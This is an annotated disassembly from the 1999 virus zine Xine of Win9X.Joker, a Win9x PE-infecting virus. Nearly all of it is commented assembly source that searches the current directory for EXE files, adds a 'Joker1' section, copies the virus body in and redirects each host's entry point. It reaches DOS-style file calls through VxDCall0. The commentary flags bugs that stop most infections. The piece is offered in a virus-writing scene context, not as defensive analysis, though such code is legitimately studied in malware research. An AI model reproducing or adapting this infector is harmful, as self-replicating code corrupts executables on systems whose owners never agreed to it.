   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 312 |
   ;                                        \-----------------------------/

   ; ===========================================================================
   ; Win9X.Joker
   ; ===========================================================================
   ;
   ; Name            : Win9X.Joker (?)
   ; Version         : N/A
   ; Original Author : Unknown
   ; Original Size   : 940 bytes
   ; Platform        : Win9x
   ; Kind            : Direct action PE infector
   ; Origin          : Unknown
   ; Dissassembly by : Billy Belceb£/iKX
   ;
   ; Some comments   :
   ;
   ; All about this  virus is a mistery. It hasn't any sign, or copyright texts,
   ; so i can't know about who is the author of this virus. If i had to guess it
   ; basing myself in the coding  style, this  virus would be  from one  of this
   ; three guys: JHB, Murkry or Mark  Ludwig. But, i'm not here  for suppose the
   ; authory of this virus, i'm here just  for disassemble it :) About the  name
   ; i've given  to this virus, it's  another supposition: it's the  name of the
   ; section that is added to all infected files by this virus.
   ;
   ; Well, about what  this virus does, it's very simple. It searches trough the
   ; current directory for files, and  infects them by adding a new section. The
   ; virus will only infect two  files per run. The new  section added will have
   ; the  name  of "Joker1", so  that's  why  i  called this  virus in that way.
   ; This virus has one enormous bug that will make it to avoid the infection of
   ; almost all PE files it  tries to, anyway  the coder  of this tiny virus has
   ; shown good skills, because he  does some really clever  things. The code is
   ; not specially optimized but anyway, it's not a problem. The thing that most
   ; impacted me is the fact that this virus DOESN'T get the delta offset in any
   ; place. It's, at least, strange :)
   ;
   ; This virus  will not  be  able to spread under NT, because instead of using
   ; APIs, it only  searches for  the VxDCall0 API, and  uses the Int21_Dispatch
   ; function of the said API, so  the virus  is very similar to a DOS infector,
   ; but under Windows. The problem  is that  in  WinNT that API doesn't exists.
   ; So, this  virus  will  only  be able  to replicate in  Win95 and  Win98 OS.
   ;
   ; The virus doesn't manifest itself in any form, it's harmless.
   ;
   ; This  is my  third  disassembly (and i hope  it won't be the last), and the
   ; first one virus i have disassembled (previously i had disassembled a tunne-
   ; ling engine and a poly  engine). It was  done all  the 27th of June. Enjoy!
   ;
   ; (c) 1999 Billy Belcebu/iKX
   ;
           .386
           .model  flat

           .data

           dd      0                       ; Some data for TLINK

   ; ---------------------------------------------------------------------------
   ; Virus data
   ; ---------------------------------------------------------------------------

   virus_size      equ     03ACh

   buffer          equ     0004h
   FindData        equ     0404h

   ;typedef struct _WIN32_FIND_DATA {
   ;   DWORD dwFileAttributes;
   ;   FILETIME ftCreationTime;            ;DD ?,?
   ;   FILETIME ftLastAccessTime;          ;DD ?,?
   ;   FILETIME ftLastWriteTime;           ;DD ?,?
   ;   DWORD nFileSizeHigh;
   ;   DWORD nFileSizeLow;
   ;   DWORD dwReserved0;
   ;   DWORD dwReserved1;
   ;   CHAR cFileName[MAX_PATH];
   ;   CHAR cAlternateFileName[ 14 ];
   ;} WIN32_FIND_DATA

   FileSizeHigh    equ     0420h
   FileSizeLow     equ     0424h
   FileAttributes  equ     0430h

   ; ---

   FileHandle      equ     0544h
   SearchHandle    equ     0548h
   ASizeOfRawData  equ     054Ch
   Ptr2LastSection equ     0550h
   AVirusSize      equ     0554h
   InfCounter      equ     0558h
   PushImm32       equ     055Ch
   OldEIP          equ     055Dh
   WorkSpace       equ     0564h

   HostEIP         equ     0584h
   RetAddress      equ     0588h

           .code

   ; ---------------------------------------------------------------------------
   ; This is the virus code
   ; ---------------------------------------------------------------------------

   virus_start:
           push    offset first_generation-400000h

   ; The above coded will be patched during infections

           pusha                           ; Save all registers
           sub     esp, WorkSpace          ; Make space for stack frame
           mov     ebp, esp                ; Save it in EBP
           call    @@1
   @@1:    pop     eax                     ; EAX = An address into host own process
           call    CheckBase               ; Get ImageBase of current process
           add     [ebp+HostEIP], eax

           cmp     dword ptr [ebp+RetAddress], 0 ; See if NULL return address
           jz      short ExitVirus

           mov     eax, [ebp+RetAddress]   ; EAX = Return address
           call    CheckBase

           or      eax, eax                ; Error?
           jz      ExitVirus               ; Shit if so...
           mov     [ebp+RetAddress], eax

           call    GetVxDCall0             ; Try to get the VxDCall0
           or      eax, eax                ; Error?
           jz      ExitVirus               ; Shit if so...

           mov     dword ptr [ebp+InfCounter], 1 ; Set infection counter
           call    FindFirstFile           ; Find a file for infect

   InfectAnother:              ; ...
           or      eax, eax                ; Error returned?
           jz      ExitVirus               ; Damn...
           cmp     dword ptr [ebp+InfCounter], 1
           ja      ExitVirus               ; Did we infected one file? If so, go away
           call    InfectFile              ; Infect!
           call    FindNextFile            ; Find another file
           jmp     InfectAnother

   ExitVirus:              ; ...
           add     esp, WorkSpace          ; Restore stack frame
           popa                            ; Restore all registers
           retn                            ; And return control to host

   ; ---------------------------------------------------------------------------
   ; This routine searches for PE mark in headers (for get ImageBase & K32)
   ; ---------------------------------------------------------------------------

   CheckBase:
           pusha                           ; Save all registers
           mov     ebp, esp                ; Make a stack frame

   SetSEHandSearch:            ; ...
           push    4010B4h                 ; SEH handler address (?)

   ; BUG! If a fault occurs, this is pointing to a hardcoded address, and it's
   ; not fixed with delta offset as it should be...

           push    dword ptr fs:0          ; Save old SEH handler
           mov     fs:0, esp               ; Put the new one
           xchg    eax, esi

   Check4MZ_PE:                ; ...
           and     esi, 0FFFFF000h         ; Align to page
           pusha                           ; Save all registers
           lodsw                           ; Get a word
           cmp     ax, "ZM"                ; MZ mark?
           jnz     continue_search
           add     esi, [esi+3Ah]
           dec     esi
           dec     esi
           lodsw
           cmp     ax, "EP"                ; Check for PE sign...
           jz      K32_Exit

           xor     eax, eax
           jmp     short K32_Exit

   continue_search:            ; ...
           popa
           sub     esi, 1000h
           jmp     short Check4MZ_PE
           mov     eax, [esp+8]            ; Fix stack
           lea     esp, [eax-20h]
           popa
           pop     dword ptr fs:0          ; Restore old SEH handler
           inc     esp                     ; Fix stack (shit from new SEH handler)
           inc     esp
           inc     esp
           inc     esp
           sub     esi, 1000h              ; Substract one page...
           jmp     SetSEHandSearch         ; and continue searching!

   K32_Exit:               ; ...
           popa
           pop     dword ptr fs:0          ; Restore old SEH handler
           add     esp, 4                  ; Clear shit of stack (new SEH handler)
           mov     [ebp+1Ch], esi          ; EAX = ESI after pushad
           popa                            ; Restore all the registers
           retn

   ; ---------------------------------------------------------------------------
   ; Get the VxDCall0 API from KERNEL32 export table
   ; ---------------------------------------------------------------------------

   GetVxDCall0:
           push    ebx                     ; Save EBX (used in routine)
           push    eax                     ; Save EAX (K32 base address)
           mov     ebx, [eax+3Ch]          ; EBX = Pointer to PE sign
           add     ebx, eax                ; RVA >> VA
           mov     ebx, [ebx+78h]          ; And now lookout in the exports for
           lea     ebx, [ebx+eax+1Ch]      ; the first API exported, that is
           mov     ebx, [ebx]              ; the VxDCall0! :)
           add     eax, [eax+ebx]          ; EAX = VxDCall0 API
           mov     fs:14h, eax             ; Store VxDCall0 into FS:14h address
           pop     eax                     ; Restore K32 base address in EAX
           pop     ebx                     ; Restore EBX
           retn                            ; Return to caller :)

   ; ---------------------------------------------------------------------------
   ; Find the first file in the current directory
   ; ---------------------------------------------------------------------------

   FindFirstFile:
           mov     ax, 714Eh               ; EAX = LFN FindFirstFile funciton
           cwde                            ; Convet word AX into doubleword EAX
           call    PerformSearch

           db      "*.EXE",0               ; EXE Wildcard

   PerformSearch:              ; ...
           pop     edx                     ; EDX = ASCIIz wildcard
           lea     edi, [ebp+FindData]     ; EDI = FindData record
           xor     ecx, ecx                ; ECX = Attributes
           lea     esi, [ecx]              ; Date time format
           inc     esi                     ; ESI = 1
           call    Int21h
           jnb     ExitSearch

           xor     eax, eax                ; Exit with error

   ExitSearch:             ; ...
           mov     [ebp+SearchHandle], eax ; Store search handle
           retn

   ; ---------------------------------------------------------------------------
   ; Find next files
   ; ---------------------------------------------------------------------------

   FindNextFile:
           mov     ax, 714Fh               ; AX = LFN FindNextFile function
           cwde                            ; Convert word AX into doubleword EAX
           lea     edi, [ebp+FindData]     ; EDI = Pointer to FindData struc
           xor     esi, esi                ; ESI = DataTime format
           inc     esi
           mov     ebx, [ebp+SearchHandle] ; EBX = Search handle
           call    Int21h

           jnb     ExitFindNextFil
           xor     eax, eax                ; EAX = 0 (Exit with error)

   ExitFindNextFil:            ; ...
           retn

   ; ---------------------------------------------------------------------------
   ; Infect the found file
   ; ---------------------------------------------------------------------------

   InfectFile:
           call    OpenFile
           jnb     continue_inf

           xor     eax, eax
           retn

   continue_inf:               ; ...
           mov     [ebp+FileHandle], eax   ; Store File Handle
           xor     ecx, ecx                ; ECX = 0
           mov     ch, 4                   ; Read 400h bytes
           call    ReadFromFile
           jb      inf_stage2

           call    CheckValidPE

   inf_stage2:             ; ...
           jb      InfError1               ; Error? Damn...

           cmp     dword ptr [ebp+FileSizeHigh], 0 ; FileSizeHigh = 0?
           jnz     InfError1               ; If so, too much great for us

           cmp     dword ptr [ebp+FileSizeLow], 7FFFEFFFh ; File too huge? Shit!
           ja      InfError1

           call    @@3
   @@3:    pop     eax
           add     eax, 13h                ; EAX = Offset where jump

   call_jump_eax:              ; ...
           call    jump_eax

           db      "Joker1",0,0            ; The name of the new section

   jump_eax:
           jmp     eax

           pop     eax                     ; Remove shit from stack
           push    esi                     ; Save ESI
           xchg    eax, esi                ; EAX = ESI

           lodsd
           lea     edi, [ebp+buffer]       ; EDI = Beginning of file header
           xor     ecx, ecx
           mov     ch, 1                   ; Search 400h bytes
           repne   scasd
           pop     esi
           jz      InfError1

           mov     ax, [esi+6]             ; AX = Number of sections
           cwde                            ; Convert Word to DoubleWord
           mov     ecx, 28h
           dec     eax
           mul     ecx
           add     eax, 0F8h
           add     eax, esi
           xchg    eax, edi                ; EDI = Pointer to last section
           mov     [ebp+Ptr2LastSection], edi

           mov     ebx, [edi+10h]          ; EBX = SizeOfRawData
           add     ebx, [edi+14h]          ; EBX = Raw pointer to end of last section
           mov     eax, ebx                ; EAX = EBX
           mov     ecx, [esi+3Ch]          ; ECX = File Alignment
           dec     eax                     ; Here it aligns that value
           add     eax, ecx
           xor     edx, edx                ; EDX = 0
           div     ecx
           mul     ecx                     ; EAX = Aligned value
           mov     edx, eax                ; EDX = EAX
           mov     [ebp+ASizeOfRawData], edx ; Save it in a variable

           mov     ecx, eax
           shr     ecx, 10h                ; Convert this to usable by the function
           xor     al, al                  ; Move pointer to where we want
           call    MoveFilePointer         ; Do it
           jnc     ContinueInf

   InfError1:              ; ...
           jmp     InfError

   ContinueInf:                ; ...
           mov     byte ptr [ebp+PushImm32], 68h ; Put PUSH imm8 opcode
           mov     edx, [esi+28h]          ; EDX = EIP of host
           mov     [ebp+OldEIP], edx       ; Store after push opcode

           lea     edx, [ebp+PushImm32]
           xor     ecx, ecx                ; ECX = 0
           mov     cl, 5                   ; ECX = 5
           call    Write2File
           jnc     Continue2               ; Jump over this if no error

   InfError:               ; ...
           jmp     CloseAndQuit            ; Shit...

   Continue2:                              ; ...
           mov     eax, virus_size         ; EAX = Virus Size
           dec     eax                     ; EAX--
           xor     edx, edx                ; EDX = 0
           mov     ecx, [esi+3Ch]          ; ECX = Alignment factor
           add     eax, ecx                ; Now the virus aligns the virus size
           div     ecx
           mul     ecx
           xchg    eax, ecx
           mov     [ebp+AVirusSize], ecx   ; And saves it into its variable

           sub     ecx, 5                  ; We substract 5 (for PUSH imm32)
           call    write_virus

   call_data:
           call    virus_start

   write_virus:
           pop     edx                     ; EDX = Points to call_data
           add     edx, [edx+1]            ; Add the call address
           add     edx, 0Ah                ; EDX = Data to write
           call    Write2File              ; Write virus body :)

           push    esi                     ; Save ESI
           mov     edi, [ebp+Ptr2LastSection] ; EDI = Pointer after last section
           add     edi, 28h                ; EDI = EDI+28h (size of section header)

           call    @@2
   @@2:    pop     eax
           add     eax, 9                  ; Jump after this shit, but for one

           jmp     call_jump_eax           ; reason... it returns us in the stack
                                           ; a pointer to the name of the new
                                           ; section :)

           pop     esi                     ; ESI = Points to "Joker1\0\0"

           lodsd                           ; We put the name of the new section
           stosd                           ; It occupies 8 bytes, so... :)
           lodsd
           stosd

           pop     esi                     ; Restore old ESI value
           mov     eax, [ebp+AVirusSize]   ; EAX = Aligned virus size
           mov     ecx, [esi+38h]          ; ECX = Section's alignment
           cdq                             ; EDX = 0
           dec     eax                     ; Align virus size to section alignment
           add     eax, ecx
           div     ecx
           mul     ecx
           stosd                           ; Section's VirtualSize

           mov     eax, [edi-28h]          ; Here the virus perform the
           add     eax, [edi-2Ch]          ; necessary actions to know
           dec     eax                     ; section's new VirtualAddress
           add     eax, ecx
           div     ecx
           mul     ecx
           stosd                           ; Section's VirtualAddress

           push    eax                     ; Store it in stack
           mov     eax, virus_size         ; EAX = VirusSize
           mov     ecx, [esi+3Ch]
           cdq                             ; EDX = 0
           dec     eax
           add     eax, ecx
           div     ecx
           mul     ecx
           stosd                           ; Section's SizeOfRawData

           mov     eax, [ebp+ASizeOfRawData]
           stosd                           ; Section's PointerToRawData

           xor     eax, eax                ; EAX = 0
           stosd                           ; Section's PointerToRelocations
           stosd                           ; Section's PointerToLineNumbers
           stosw                           ; Section's NumberofRelocations
           stosw

           mov     eax, 20000020h          ; Section's attributes
           stosd                           ; (Text, Writable)
           lea     esi, [ebp+40h]
           lodsd
           lea     esi, [ebp+eax+4]        ; ESI = Pointer to file header
           pop     eax                     ; EAX = New section's VirtualAddress
           mov     [esi+28h], eax          ; Set it as new EntryPoint

           inc     word ptr [esi+6]        ; Increase number of sections

           mov     eax, [ebp+AVirusSize]
           add     [esi+1Ch], eax          ; Add to SizeOfCode the aligned virus size
           mov     ebx, [esi+50h]          ; EBX = Old SizeOfImage
           add     eax, ebx                ; EAX = Aligned virus size+SizeOfImage
           mov     ecx, [esi+38h]          ; ECX = SectionAlignment
           dec     eax                     ; Align VirusSize+SizeOfCode
           xor     edx, edx                ; to the SectionAlignment
           add     eax, ecx
           div     ecx
           mul     ecx
           mov     [esi+50h], eax          ; Store the new SizeOfImage

           xor     edx, edx                ; EDX = 0
           mov     ecx, edx                ; ECX = 0
           xor     al, al                  ; AL = 0 (Ptr to wanted position)
           call    MoveFilePointer

           lea     edx, [ebp+buffer]       ; EDX = Pointer to virus in stack
           xor     ecx, ecx                ; ECX = 0
           mov     ch, 4                   ; Append 400h bytes
           call    Write2File

           inc     dword ptr [ebp+InfCounter] ; Increase inf. counter

   CloseAndQuit:               ; ...
           push    eax                     ; Save EAX
           call    CloseFile               ; Close opened file
           pop     eax                     ; Restore EAX
           retn

   ; ---------------------------------------------------------------------------
   ; Get File Attributes
   ; ---------------------------------------------------------------------------

   GetAttributes:              ; AX = Function GetFileAttributes
           mov     ax, 4300h
           cwde                            ; Convert word AX in dword EAX
           lea     edx, [ebp+FileAttributes] ; EDX = Pointer to file name
           call    Int21h
           retn

   ; ---------------------------------------------------------------------------
   ; Move the file pointer to the desired address
   ; ---------------------------------------------------------------------------

   MoveFilePointer:
           push    ebx                     ; Save EBX
           mov     ah, 42h                 ; AH = Function SetFilePointer
           cwde                            ; Convert word AX in dword EAX
           xchg    al, bl                  ; AL = Where set pointer
           mov     ebx, [ebp+FileHandle]   ; EBX = File Handle
           call    Int21h
           pop     ebx                     ; Restore EBX
           retn

   ; ---------------------------------------------------------------------------
   ; Open file for Read/Write
   ; ---------------------------------------------------------------------------

   OpenFile:
           mov     ax, 3D02h               ; AX = Open for read/write
           cwde                            ; Convert word AX into dword EAX
           lea     edx, [ebp+FileAttributes] ; EDX = Pointer filename to open
           xor     ecx, ecx                ; ECX = Attributes
           call    Int21h
           retn

   ; ---------------------------------------------------------------------------
   ; Read given bytes from opened file
   ; ---------------------------------------------------------------------------

   ReadFromFile:
           mov     ax, 3F00h               ; AX = ReadFile function
           cwde                            ; Convert word AX into dword EAX
           mov     ebx, [ebp+FileHandle]   ; EBX = File Handle
           lea     edx, [ebp+buffer]       ; EDX = Where put read data
           call    Int21h
           retn

   ; ---------------------------------------------------------------------------
   ; Write desired data to opened file
   ; ---------------------------------------------------------------------------

   Write2File:
           push    ebx                     ; Save EBX
           mov     ax, 4000h               ; AX = Write function
           cwde                            ; Convert word AX in dword EAX
           mov     ebx, [ebp+FileHandle]   ; EBX = File Handle
           call    Int21h                  ; Win9X Int21h's clone
           pop     ebx                     ; Restore EBX
           retn

   ; ---------------------------------------------------------------------------
   ; Close the previously opened file
   ; ---------------------------------------------------------------------------

   CloseFile:
           mov     ax, 3E00h               ; AX = Close File function
           cwde                            ; EDX = 0
           mov     ebx, [ebp+FileHandle]   ; EBX = File handle
           call    Int21h
           retn

   ; ---------------------------------------------------------------------------
   ; Check for a valid PE file
   ; ---------------------------------------------------------------------------

   CheckValidPE:
           push    eax
           push    ecx
           lea     esi, [ebp+40h]          ; Go firstly to 3Ch field in
           lodsd                           ; the PE header, and later check
           lea     esi, [ebp+eax+4]        ; the offset that it marks
           lodsw                           ; and see if points to the
           cmp     ax, 'EP'                ; PE mark :)
           jnz     ErrorExit
           stc
           dec     esi                     ; Fix ESI, so it'll point to the
           dec     esi                     ; beginning of PE header again

   ; VERY IMPORTANT BUG!
   ; The number of sections variable is a word in the PE header, not a dword. So
   ; with the below code, the virus will put some shit in the more significant
   ; word of EAX, that will make the checks to fail, and return an error instead
   ; of infecting a file that could be infected :(

           mov     eax, [esi+6]            ; Tries to put in EAX the number
                                           ; of sections

   ; It should be MOVZX EAX,WORD PTR [ESI+6], or MOV AX,[ESI+6] / CWDE

           inc     eax                     ; Increase it
           mov     ecx, 28h
           mul     ecx
           add     eax, 0F8h
           add     eax, [ebp+40h]
           cmp     eax, 400h               ; Section table too big?
           ja      ErrorExit               ; If so, quit with error

   GlobalExit:             ; ...
           pop     ecx                     ; Restore values from stack
           pop     eax
           retn

   ErrorExit:              ; ...
           stc
           jmp     GlobalExit

   ; ---------------------------------------------------------------------------
   ; The pseudo INT 21h
   ; ---------------------------------------------------------------------------

   Int21h:
           push    ecx
           push    eax
           push    2A0010h
           call    dword ptr fs:14h
           retn

   ; ---------------------------------------------------------------------------
   ; First generation fake host
   ; ---------------------------------------------------------------------------

   extrn   ExitProcess:PROC

   first_generation:
           push    0FFh
           call    ExitProcess
   end     virus_start
